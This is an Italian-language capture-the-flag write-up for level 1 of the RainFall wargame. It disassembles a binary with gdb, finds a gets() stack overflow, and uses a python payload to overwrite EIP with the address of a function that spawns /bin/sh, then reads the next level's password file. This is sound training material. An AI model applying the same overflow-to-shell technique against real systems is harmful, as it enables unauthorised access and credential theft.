#Level 1

L'eseguibile presente nella home richiede un input e termina la sua
esecuzione. Per scoprire qualcosa in più esegui il comando: 
`readelf -p '.rodata' level1` ed ottengo il seguente output:
```
String dump of section '.rodata':
  [     8]  Good... Wait what?^J
  [    1c]  /bin/sh
```
Queste stringhe sono presenti nel binario ma nell'esecuzione non
appaiono, dunque non resta che aprire `gdb`:
```
level1@RainFall:~$ gdb -q level1
Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini
(gdb) disass main
Dump of assembler code for function main:
   0x08048480 <+0>:     push   %ebp
   0x08048481 <+1>:     mov    %esp,%ebp
   0x08048483 <+3>:     and    $0xfffffff0,%esp
   0x08048486 <+6>:     sub    $0x50,%esp
   0x08048489 <+9>:     lea    0x10(%esp),%eax
   0x0804848d <+13>:    mov    %eax,(%esp)
   0x08048490 <+16>:    call   0x8048340 <gets@plt>
   0x08048495 <+21>:    leave
   0x08048496 <+22>:    ret
End of assembler dump.
(gdb) disass run
Dump of assembler code for function run:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     sub    $0x18,%esp
   0x0804844a <+6>:     mov    0x80497c0,%eax
   0x0804844f <+11>:    mov    %eax,%edx
   0x08048451 <+13>:    mov    $0x8048570,%eax
   0x08048456 <+18>:    mov    %edx,0xc(%esp)
   0x0804845a <+22>:    movl   $0x13,0x8(%esp)
   0x08048462 <+30>:    movl   $0x1,0x4(%esp)
   0x0804846a <+38>:    mov    %eax,(%esp)
   0x0804846d <+41>:    call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:    movl   $0x8048584,(%esp)
   0x08048479 <+53>:    call   0x8048360 <system@plt>
   0x0804847e <+58>:    leave
   0x0804847f <+59>:    ret
End of assembler dump.
```
Con il comando `info functions` abbiamo l'elenco delle funzioni
presenti e scopriamo che ci sono due funzioni scritte dall'utente 
`main` e `run`.
Con `disass main` vediamo che viene dichiarato 
probabilmente un array da 64 byte per poi esser passato alla funzione
`gets` che caricherà l'input dell'utente nel buffer da 64 byte.
Con `disass run` possiamo leggere una funzione che stampa il testo `Good... Wait what?\n`
tramite `fwrite` e successivamente chiama la funzione `system` passando come argomento
`/bin/sh`.

Sull'input inserito dall'utente non abbiamo alcun controllo dunque basterà
inserire una quantità tale di caratteri da sovrascrivere l'indirizzo in `eip`
sostituendolo con l'indirizzo della funzione `run` ovvero `0x08048444` così
portiamo l'esecuzione del programma sulla funzione `run` e avremo una shell
con i giusti permessi.

Sfruttando il sito [Buffer Overflow EIP Offset String Generator](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/)
generiamo una stringa lunga 80 caratteri così da individuare l'offset dell'indirizzo
del registro contenuto in `eip`:
```
level1@RainFall:~$ echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac" > /tmp/exploit
level1@RainFall:~$ gdb -q level1
Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
(gdb) r < /tmp/exploit
Starting program: /home/user/level1/level1 < /tmp/exploit

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()
```
Dal messaggio di errore possiamo effettivamente capire che l'offset si trova
al carattere 76. Quindi basta scrivere in input 76 caratteri più l'indirizzo della
funzione `run`:
```
level1@RainFall:~$ python -c 'print("a"*76+"\x44\x84\x04\x08")' > /tmp/exploit
level1@RainFall:~$ cat /tmp/exploit - | ./level1
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
Utilizziamo il carattere `-` per far si che cat non invii il segnale di `EOF`
e la shell rimanga aperta.
Adesso non resta che:
```
level1@RainFall:~$ su level2
Password: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level2/level2
level2@RainFall:~$
```
